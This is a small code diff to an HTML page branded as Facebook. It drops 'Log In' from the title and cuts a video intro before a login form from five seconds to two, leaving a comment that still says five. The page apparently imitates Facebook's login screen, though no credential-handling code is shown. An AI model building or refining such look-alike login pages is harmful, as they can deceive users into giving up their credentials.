@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook - Log In</title>
+    <title>Facebook</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; background-color: #f0f2f5; margin: 0; padding: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
@@ -75,7 +75,7 @@
         const videoContainer = document.getElementById('video-container');
 
         video.addEventListener('timeupdate', function() {
-            if (video.currentTime >= 5) { // Play for 5 seconds
+            if (video.currentTime >= 2) { // Play for 5 seconds
                 videoContainer.style.display = 'none';
                 loginContainer.style.display = 'block';
                 video.pause();
